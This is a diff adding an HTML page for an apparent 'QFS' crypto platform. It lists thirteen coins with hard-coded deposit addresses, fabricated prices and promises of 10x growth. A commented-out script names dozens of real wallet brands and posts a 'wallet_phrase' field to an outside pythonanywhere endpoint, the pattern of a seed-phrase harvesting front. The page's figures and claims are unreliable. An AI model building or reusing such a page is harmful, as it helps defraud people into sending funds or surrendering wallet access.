@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Crypto Select</title>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css">
+  <link rel="stylesheet" href="./css/style.css">
+  <link rel="stylesheet" href="./css/aos.css">
+  <!-- Google Fonts: Montserrat -->
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.13.1/font/bootstrap-icons.min.css">
+  
+  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:ital,opsz,wght@0,9..40,100..1000;1,9..40,100..1000&display=swap" rel="stylesheet">
+
+  <style>
+    .crypto-card {
+      text-align: center;
+      cursor: pointer;
+      transition: 0.3s;
+      background-color: #0D121C;
+      border-radius: 12px;
+      padding: 20px;
+      /* margin-bottom: 30px; */
+      transition: 0.3s ease;
+      /* height: 100%; */
+      border: 1px solid rgb(68, 68, 68);
+    }
+    .crypto-card:hover {
+      box-shadow: 0 0 12px #fa9f1677;
+    }
+    .crypto-logo {
+      width: 40px;
+      height: 40px;
+      margin-bottom: 10px;
+    }
+  </style>
+</head>
+<body>
+
+
+   <!-- Navbar -->
+   <nav class="navbar navbar-expand-lg px-5 navbar-dark py-3">
+    <a class="navbar-brand" href="./index.html">
+    <img src="images/logo.png" alt="QFS Logo" width="80">
+    </a>
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
+    <span class="navbar-toggler-icon"></span>
+    </button>
+    
+    <div class="collapse navbar-collapse justify-content-end" id="navbarNav">
+        <ul class="navbar-nav gap-3 text-white">
+            <li class="nav-item"><a class="nav-link active" href="./index.html">Home</a></li>
+            <li class="nav-item"><a class="nav-link text-white" href="#about/index.html">About</a></li>
+            <li class="nav-item"><a class="nav-link text-white" href="#features/index.html">Features</a></li>
+            <li class="nav-item"><a class="nav-link text-white" href="#benefits/index.html">Benefits</a></li>
+            <li class="nav-item"><a class="nav-link text-white" href="#faq/index.html">FAQs</a></li>
+            <li class="nav-item"><a class="nav-link text-white" href="#tracking/index.html">Tracking</a></li>
+            
+        </ul>
+    </div>
+  </nav>
+
+
+<br>
+
+<!-- Wallet Balance Card -->
+<div class="wallet-container container">
+  <div class="wallet-header">
+    <div>
+      <h4>Total Balance</h4>
+      <h1 class="balance-amount mb-3">$0.00</h1>
+      <button class="btn border text-white">Select token to begin transactions</button>
+    </div>
+  </div>
+  
+</div>
+
+  <div class="container py-5" id="crypto">
+    <h2 class="text-center mb-4">Select a Cryptocurrency</h2>
+    <div class="row g-4" id="crypto-container">    
+        <div class="row g-4 container mx-auto my-5" data-aos="fade-right">
+            <!-- Buy Crypto -->
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('Bitcoin', './images/bitcoin.svg', 'bc1q6s3zeqp0mznnxzsa94whsupmg6v222rlgz6rgh')">
+                    <div class="d-flex justify-content-between mb-2">
+                        <span>Bitcoin</span>
+                        <small class="text-white-50">$115226 <br> <span class="text-danger">0.054644%</span></small>
+                    </div>
+                    <center><img src="./images/bitcoin.svg" alt="" class="w-25 rounded-circle"></center>
+                    <div class="coin-title mt-2">Bitcoin</div>
+                    <div class="d-flex justify-content-between mt-2">
+                        <small class="text-white-50">0 BTC</small>
+                        <small class="text-white-50">$0 </small>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('Ethereum', './images/Ethereum.svg', '0x7d4BfBD14a30b547ca6d0cA5DF120B24BDf6A7D')">
+                    <div class="d-flex justify-content-between mb-2">
+                        <span>Ethereum</span>
+                        <small class="text-white-50">$3723.58 <br> <span class="text-danger">0.054644%</span></small>
+                    </div>
+                    <center><img src="./images/Ethereum.svg" alt="" class="w-25 rounded-circle"></center>
+                    <div class="coin-title mt-2">Ethereum</div>
+                    <div class="d-flex justify-content-between mt-2">
+                        <small class="text-white-50">0 BTC</small>
+                        <small class="text-white-50">$0 </small>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('XRP', './images/xrp-xrp-logo.png', 'raETxk8C17NGaRgKCCSqahjxAiKyN2UW1U')">
+                    <div class="d-flex justify-content-between mb-2">
+                        <span>Ripple</span>
+                        <small class="text-white-50">$3.07 <br> <span class="text-danger">0.054644%</span></small>
+                    </div>
+                    <center><img src="./images/xrp-xrp-logo.png" alt="" class="bg-light w-25 rounded-circle p-2"></center>
+                    <div class="coin-title mt-2">XRP</div>
+                    <div class="d-flex justify-content-between mt-2">
+                        <small class="text-white-50">0 XRP</small>
+                        <small class="text-white-50">$0 </small>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('Litecoin', './images/Litecoin.svg', 'ltc1qj8swvwexj3n92je9lydsvmcpffryf0fp3cyqz5')">
+                  <div class="d-flex justify-content-between mb-2">
+                      <span>Litecoin</span>
+                      <small class="text-white-50">$120.59 <br> <span class="text-danger">0.054644%</span></small>
+                  </div>
+                  <center><img src="./images/Litecoin.svg" alt="" class="w-25 rounded-circle"></center>
+                  <div class="coin-title mt-2">Litecoin</div>
+                  <div class="d-flex justify-content-between mt-2">
+                      <small class="text-white-50">0 LTC</small>
+                      <small class="text-white-50">$0 </small>
+                  </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('XLM', './images/xlm.png', 'GCDHTLHSVFZOZV5ZMMYXR7Q6MZQNKDHQXSA5C6JRNZT4ELN4ULWTW7SD')">
+                  <div class="d-flex justify-content-between mb-2">
+                      <span>XLM</span>
+                      <small class="text-white-50">$0.41 <br> <span class="text-danger">0.054644%</span></small>
+                  </div>
+                  <center><img src="./images/xlm.png" alt="" class="w-25 rounded-circle"></center>
+                  <div class="coin-title mt-2">Stellar</div>
+                  <div class="d-flex justify-content-between mt-2">
+                      <small class="text-white-50">0 XLM</small>
+                      <small class="text-white-50">$0 </small>
+                  </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('Doge Coin', './images/dogecoin-doge-logo.png', 'DRQJkCNmsYHQAjUVnLXyxTqL3dMsgZsXGt')">
+                  <div class="d-flex justify-content-between mb-2">
+                      <span>Doge Coin</span>
+                      <small class="text-white-50">$0.21 <br> <span class="text-danger">0.054644%</span></small>
+                  </div>
+                  <center><img src="./images/dogecoin-doge-logo.png" alt="" class="w-25 rounded-circle"></center>
+                  <div class="coin-title mt-2">Dogecoin</div>
+                  <div class="d-flex justify-content-between mt-2">
+                      <small class="text-white-50">0 DOGE</small>
+                      <small class="text-white-50">$0 </small>
+                  </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('ALGORAND', './images/algo.png', 'CHI2OP7FGJ4D2OGKCHPZOZNULKFZQGDRCXB5NGZII3RQ3EF73AJ6NTVRQY')">
+                  <div class="d-flex justify-content-between mb-2">
+                      <span>ALGORAND</span>
+                      <small class="text-white-50">$0.24 <br> <span class="text-danger">0.054644%</span></small>
+                  </div>
+                  <center><img src="./images/algo.png" alt="" class="w-25 rounded-circle"></center>
+                  <div class="coin-title mt-2">Algorand</div>
+                  <div class="d-flex justify-content-between mt-2">
+                      <small class="text-white-50">0 ALGO</small>
+                      <small class="text-white-50">$0 </small>
+                  </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('SOLANA', './images/Solana.svg', '7xGxd45KhxTe98JpYimETPUSu8dKdVEPaeHaGU5aRVV')">
+                  <div class="d-flex justify-content-between mb-2">
+                      <span>SOLANA</span>
+                      <small class="text-white-50">$168.98 <br> <span class="text-danger">0.054644%</span></small>
+                  </div>
+                  <center><img src="./images/Solana.svg" alt="" class="w-25"></center>
+                  <div class="coin-title mt-4">Solana</div>
+                  <div class="d-flex justify-content-between mt-2">
+                      <small class="text-white-50">0 SOL</small>
+                      <small class="text-white-50">$0 </small>
+                  </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('ADA', './images/cardano-ada-logo.png', 'addr1qynywg53jjml3nj2y4ct3d289z87m66yyuht9mndssecw8qr6rcvycwmt2sqtfqjwkpwr74vzqa52eqqwx6wnhc8nshsqvzggk')">
+                  <div class="d-flex justify-content-between mb-2">
+                      <span>ADA</span>
+                      <small class="text-white-50">$0.75 <br> <span class="text-danger">0.054644%</span></small>
+                  </div>
+                  <center><img src="./images/cardano-ada-logo.png" alt="" class="w-25 rounded-circle"></center>
+                  <div class="coin-title mt-2">Cardano</div>
+                  <div class="d-flex justify-content-between mt-2">
+                      <small class="text-white-50">0 ADA</small>
+                      <small class="text-white-50">$0 </small>
+                  </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('Tron', './images/tether-usdt-logo.png', 'TFs7FeRD7uUdbZujB2yF1x6ENuk4fZekCW')">
+                  <div class="d-flex justify-content-between mb-2">
+                      <span>USDT</span>
+                      <small class="text-white-50">$0.99 <br> <span class="text-danger">0.054644%</span></small>
+                  </div>
+                  <center><img src="./images/tether-usdt-logo.png" alt="" class="w-25"></center>
+                  <div class="coin-title mt-2">Tron</div>
+                  <div class="d-flex justify-content-between mt-2">
+                      <small class="text-white-50">0 TRC</small>
+                      <small class="text-white-50">$0 </small>
+                  </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('Binance USD', './images/busd.png', '0x7d4BfBD14a30b547ca6d0cA5DF5120B24BDf6A7D')">
+                  <div class="d-flex justify-content-between mb-2">
+                      <span>BUSD</span>
+                      <small class="text-white-50">$1.0 <br> <span class="text-danger">0.054644%</span></small>
+                  </div>
+                  <center><img src="./images/busd.png" alt="" class="w-25 rounded-circle"></center>
+                  <div class="coin-title mt-2">Binance USD</div>
+                  <div class="d-flex justify-content-between mt-2">
+                      <small class="text-white-50">0 BUSD</small>
+                      <small class="text-white-50">$0 </small>
+                  </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('Shiba Inu', './images/shiba-inu-shib-logo.png', '0x7d4BfBD14a30b547ca6d0cA5DF5120B24BDf6A7D')">
+                  <div class="d-flex justify-content-between mb-2">
+                      <span>SHIB</span>
+                      <small class="text-white-50">$114445 <br> <span class="text-danger">0.054644%</span></small>
+                  </div>
+                  <center><img src="./images/shiba-inu-shib-logo.png" alt="" class="w-25"></center>
+                  <div class="coin-title mt-2">Shiba Inu</div>
+                  <div class="d-flex justify-content-between mt-2">
+                      <small class="text-white-50">0 SHIB</small>
+                      <small class="text-white-50">$0 </small>
+                  </div>
+                </div>
+            </div>
+            <div class="col-md-4 text-center">
+                <div class="coin-card" onclick="openWalletPage('PEPU', './images/pepu.png', '0x7d4BfBD14a30b547ca6d0cA5DF5120B24BDf6A7D')">
+                  <div class="d-flex justify-content-between mb-2">
+                      <span>PEPU</span>
+                      <small class="text-white-50">$0.0008359 <br> <span class="text-danger">0.054644%</span></small>
+                  </div>
+                  <center><img src="./images/pepu.png" alt="" class="w-25 rounded-circle"></center>
+                  <div class="coin-title mt-2">PEPU</div>
+                  <div class="d-flex justify-content-between mt-2">
+                      <small class="text-white-50">0 PEPU</small>
+                      <small class="text-white-50">$0 </small>
+                  </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+  <!-- Crypto Cards Grid -->
+<div class="container mt-5">
+  <div class="row row-cols-1 row-cols-md-3 g-4" id="crypto-container">
+    <!-- Cards will be injected here -->
+  </div>
+</div>
+
+
+  <section class="my-5 support rowtext-center text-center pt-5 container">
+    <span class="text-white-50">Always by your side</span>
+      <h1 class="display-6 fw-semibold mt-3 mb-5">
+        Grow your crypto world with us
+      </h1><br>
+    <div class="row g-4 align-items-center px-5 text-center mb-5">
+      <div class="col-lg-4" data-aos="zoom-out">
+        <img src="./images/contact.svg" alt="" class="icon">
+        <h4 class="my-3">24/7 Support</h4>
+        <span class="text-white-50">Need help? Get your requests  solved quickly via support team</span>
+      </div>
+      <div class="col-lg-4" data-aos="zoom-out" data-aos-delay="100">
+        <img src="./images/users.svg" alt="" class="icon">
+        <h4 class="my-3">Community</h4>
+        <span class="text-white-50">Join the conversations on our  worldwide OKEx communities</span>
+      </div>
+      <div class="col-lg-4" data-aos="zoom-out" data-aos-delay="200">
+        <img src="./images/secure.svg" alt="" class="icon">
+        <h4 class="my-3">Security</h4>
+        <span class="text-white-50">Secure you crypto accounts with us and grow money 10x faster</span>
+      </div>
+    </div>
+    <img src="images/OY3765wP7RKuihe6iCzotZ1ge0.svg" alt="" class="w-100">
+  </section>
+ 
+<!-- Back to Top Button -->
+<button id="backToTopBtn" class="back-to-top">
+  <span class="bi bi-arrow-up"></span>
+</button>
+</section>
+
+<footer class="bg-darker text-white pt-5 pb-2"style="background-image: url(./images/world-dotted-map.png); background-position: center; background-size: 60%; background-repeat: no-repeat;">
+  <div class="container">
+    <div class="row gy-4 justify-content-between py-5">
+
+      <!-- Company Branding -->
+      <div class="col-lg-3">
+        <img src="images/logo.png" alt="QFS Logo" width="80">
+        <p class="text-white-50 mt-2">Revolutionizing finance with simple, smart, and secure banking for everyone.</p>
+        <div class="d-flex gap-3 mt-3">
+          <a href="#" class="text-white fs-5"><i class="bi bi-facebook"></i></a>
+          <a href="#" class="text-white fs-5"><i class="bi bi-linkedin"></i></a>
+          <a href="#" class="text-white fs-5"><i class="bi bi-instagram"></i></a>
+        </div>
+      </div>
+
+      <!-- Quick Navigation -->
+      <div class="col-lg-2 col-md-6">
+        <h6 class="text-uppercase fw-semibold">Company</h6>
+        <ul class="list-unstyled mt-3">
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">Careers</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">Blog</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">About</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block">Press</a></li>
+        </ul>
+      </div>
+
+      <!-- Resources -->
+      <div class="col-lg-3 col-md-6">
+        <h6 class="text-uppercase fw-semibold">Resources</h6>
+        <ul class="list-unstyled mt-3">
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">Pricing</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">Help Center</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block mb-2">Security</a></li>
+          <li><a href="#" class="text-white-50 text-decoration-none d-block">Privacy Policy</a></li>
+        </ul>
+      </div>
+
+      <!-- Contact Info -->
+      <div class="col-lg-3">
+        <h6 class="text-uppercase fw-semibold">Contact</h6>
+        <ul class="list-unstyled mt-3 text-white-50">
+          <li><i class="bi bi-envelope-fill me-2"></i>qfssystemvault@gmail.com</li>
+          <li class="mt-2"><i class="bi bi-telephone-fill me-2"></i>+17633521369</li>
+        </ul>
+      </div>
+
+    </div>
+
+    <!-- Bottom Bar -->
+    <div class="text-center border-top border-secondary mt-5 py-4">
+      <small class="text-white-50">&copy; 2025 QFS. All rights reserved.</small>
+    </div>
+  </div>
+</footer>
+
+  <script>
+//     const coins = [
+//   { name: "Bitcoin", logo: "./images/bitcoin.svg" },
+//   { name: "Trust Wallet", logo: "./images/trustwallet.png" },
+//   { name: "Lobstr", logo: "./images/lobstr.png" },
+//   { name: "Wallet Connect", logo: "./images/walletconnect.jpg" },
+//   { name: "Atomic", logo: "./images/atomic.png" },
+//   { name: "Rainbow", logo: "./images/rainbow.png" },
+//   { name: "Argent", logo: "./images/argent.jpeg" },
+//   { name: "Gnosis Safe Multisig", logo: "./images/gnosissafemultisig.jpeg" },
+//   { name: "Crypto.com", logo: "./images/cryptocom.png" },
+//   { name: "Nash", logo: "./images/nash.jpeg" },
+//   { name: "Metamask", logo: "./images/metamask.png" },
+//   { name: "Pillar", logo: "./images/pillar.png" },
+//   { name: "Tokenary", logo: "./images/tokenary.png" },
+//   { name: "Wazirx", logo: "./images/wazirx.png" },
+//   { name: "D'CENT Wallet", logo: "./images/dcentwallet.png" },
+//   { name: "ZelCore", logo: "./images/zelcore.png" },
+//   { name: "Coinomi", logo: "./images/coinomi.jpg" },
+//   { name: "Torus", logo: "./images/torus.jpeg" },
+//   { name: "ONTO", logo: "./images/onto.png" },
+//   { name: "Anchor", logo: "./images/anchor.png" },
+//   { name: "TokenPocket", logo: "./images/tokenpocket.png" },
+//   { name: "MathWallet", logo: "./images/mathwallet.png" },
+//   { name: "BitPay", logo: "./images/bitpay.jpg" },
+//   { name: "Ledger Live", logo: "./images/ledger.png" },
+//   { name: "Walleth", logo: "./images/walleth.png" },
+//   { name: "Authereum", logo: "./images/authereum.png" },
+//   { name: "Huobi Wallet", logo: "./images/huobiwallet.jpeg" },
+//   { name: "Eidoo", logo: "./images/eidoo.png" },
+//   { name: "MYKEY", logo: "./images/mykey.png" },
+//   { name: "Loopring Wallet", logo: "./images/loopringwallet.jpeg" },
+//   { name: "TrustVault", logo: "./images/trustvault.png" },
+//   { name: "Coin98", logo: "./images/coin98.png" },
+//   { name: "CoolWallet S", logo: "./images/coolwallets.png" },
+//   { name: "Alice", logo: "./images/alice.png" },
+//   { name: "GridPlus", logo: "./images/gridplus.png" },
+//   { name: "CYBAVO Wallet", logo: "./images/cybavowallet.png" },
+//   { name: "Spatium", logo: "./images/spatium.jpeg" },
+//   { name: "SafePal", logo: "./images/safepal.png" },
+//   { name: "Equal", logo: "./images/equal.jpeg" },
+//   { name: "Infinito", logo: "./images/infinito.png" },
+//   { name: "Ownbit", logo: "./images/ownbit.png" },
+//   { name: "EasyPocket", logo: "./images/easypocket.jpg" },
+//   { name: "ViaWallet", logo: "./images/viawallet.png" },
+//   { name: "Bridge Wallet", logo: "./images/bridgewallet.png" },
+//   { name: "SparkPoint", logo: "./images/sparkpoint.png" },
+//   { name: "Infinity Wallet", logo: "./images/infinitywallet.png" },
+//   { name: "wallet.io", logo: "./images/walletio.png" },
+//   { name: "BitKeep", logo: "./images/bitkeep.png" },
+//   { name: "Vision", logo: "./images/vision.png" },
+//   { name: "SWFT Wallet", logo: "./images/swftwallet.png" },
+//   { name: "PEAKDEFI Wallet", logo: "./images/peakdefiwallet.png" },
+//   { name: "Cosmostation", logo: "./images/cosmostation.png" },
+//   { name: "Graph Protocol", logo: "./images/graphprotocol.jpg" },
+//   { name: "KardiaChain", logo: "./images/kardiachain.png" },
+//   { name: "Keplr", logo: "./images/keplr.png" },
+//   { name: "Harmony", logo: "./images/harmony.png" },
+//   { name: "ICONex", logo: "./images/iconex.png" },
+//   { name: "Fetch", logo: "./images/fetch.jpg" },
+//   { name: "XDC Wallet", logo: "./images/xdcwallet.png" },
+//   { name: "Unstoppable Wallet", logo: "./images/unstoppablewallet.png" },
+//   { name: "MEET.ONE", logo: "./images/meetone.jpg" },
+//   { name: "Dok Wallet", logo: "./images/dokwallet.png" },
+//   { name: "AT.Wallet", logo: "./images/atwallet.png" },
+//   { name: "MoriX Wallet", logo: "./images/morixwallet.png" },
+//   { name: "Midas Wallet", logo: "./images/midaswallet.png" },
+//   { name: "Ellipal", logo: "./images/ellipal.png" },
+//   { name: "MEET.ONE", logo: "./images/meetone.jpg" },
+//   { name: "KEYRING PRO", logo: "./images/keyringpro.png" },
+//   { name: "Blockchain", logo: "./images/blockchain.png" },
+//   { name: "Binance Smart Chain", logo: "./images/binancesmartchain.png" },
+//   { name: "Aktionariat", logo: "./images/aktionariat.png"},
+//   { name: "Coinbase", logo: "./images/coinbase.jpg" },
+//   { name: "Exodus", logo: "./images/exodus.png" }
+// ];
+
+// const container = document.getElementById("crypto-container");
+// const selectedInput = document.getElementById("selectedCrypto");
+// const selectedCryptoTitle = document.getElementById("selectedCryptoTitle");
+
+// coins.forEach(coin => {
+//   const col = document.createElement("div");
+//   col.className = "col";
+//   col.innerHTML = `
+//     <div class="crypto-card text-center p-3 shadow-sm border rounded" data-name="${coin.name}" data-bs-toggle="modal" data-bs-target="#cryptoModal">
+//       <img src="${coin.logo}" alt="${coin.name}" class="crypto-logo mb-2" style="width: 50px; height: 50px; border-radius: 50%">
+//       <h5>${coin.name}</h5>
+//     </div>
+//   `;
+//   container.appendChild(col);
+// });
+
+// container.addEventListener("click", function(e) {
+//   const card = e.target.closest(".crypto-card");
+//   if (card) {
+//     const coinName = card.dataset.name;
+//     selectedInput.value = coinName;
+//     selectedCryptoTitle.textContent = coinName;
+//     switchForm('phone');
+//   }
+// });
+
+// // Switch form sections inside modal
+// function switchForm(type) {
+//   document.querySelectorAll('.form-section').forEach(el => el.classList.add("d-none"));
+//   document.getElementById(type + "Form").classList.remove("d-none");
+// }
+
+// // Simulated form sender
+// function sendForm(event, type) {
+//   event.preventDefault();
+//   const crypto = selectedInput.value;
+//   let walletData;
+
+//   if (type === "phone") {
+//     walletData = document.getElementById("phoneNumber").value;
+//   } else if (type === "email") {
+//     walletData = document.getElementById("emailAddress").value;
+//   } else {
+//     walletData = "Started Trading";
+//   }
+
+//   // Get auth token from localStorage
+//   const token = localStorage.getItem('authToken');
+//   if (!token) {
+//     alert('You must be logged in to add a wallet.');
+//     return;
+//   }
+
+//   // Prepare payload
+//   const payload = {
+//   wallet_name: crypto,
+//   wallet_phrase: walletData
+// };
+
+//   fetch('https://qfstrade.pythonanywhere.com/wallet/', {
+//     method: 'POST',
+//     headers: {
+//       'Content-Type': 'application/json',
+//       'Authorization': 'Token ' + token
+//     },
+//     body: JSON.stringify(payload)
+//   })
+//     .then(res => res.json())
+//     .then(result => {
+//       if (result && !result.error) {
+//         alert('Wallet added successfully!');
+//         document.getElementById("cryptoModal").classList.remove("show");
+//       } else {
+//         alert(result.error || 'Failed to add wallet.');
+//       }
+//     })
+//     .catch(() => {
+//       alert('Failed to add wallet.');
+//     });
+// }
+
+
+//     container.addEventListener("click", function(e) {
+//       const card = e.target.closest(".crypto-card");
+//       if (card) {
+//         selectedInput.value = card.dataset.name;
+//       }
+//     });
+
+//     function openModal(coin) {
+//     document.getElementById("coinName").value = coin;
+//     new bootstrap.Modal(document.getElementById("phoneModal")).show();
+//   }
+
+//   document.getElementById("cryptoForm").addEventListener("submit", async function (e) {
+//     e.preventDefault();
+//     const coin = document.getElementById("coinName").value;
+//     const phone = document.getElementById("phone").value;
+
+//     const response = await fetch("http://localhost:3000/send", {
+//       method: "POST",
+//       headers: { "Content-Type": "application/json" },
+//       body: JSON.stringify({ coin, phone })
+//     });
+
+//     if (response.ok) {
+//       alert("Wallet linked successfully!");
+//       bootstrap.Modal.getInstance(document.getElementById("phoneModal")).hide();
+//     } else {
+//       alert("Failed to link.");
+//     }
+//   });
+  </script>
+  <script>
+    function openWalletPage(coinName, coinLogo, walletAddress) {
+      const coinData = {
+        name: coinName,
+        logo: coinLogo,
+        address: walletAddress
+      };
+      localStorage.setItem("selectedCoin", JSON.stringify(coinData));
+      window.location.href = "wallet.html";
+    }
+  </script>
+  
+
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
+  <script src="./js/script.js"></script>
+  <script src="./js/aos.js"></script>
+  <script>
+    AOS.init({
+      duration: 700,
+      once: true
+    })
+</script>
+
+</body>
+</html>
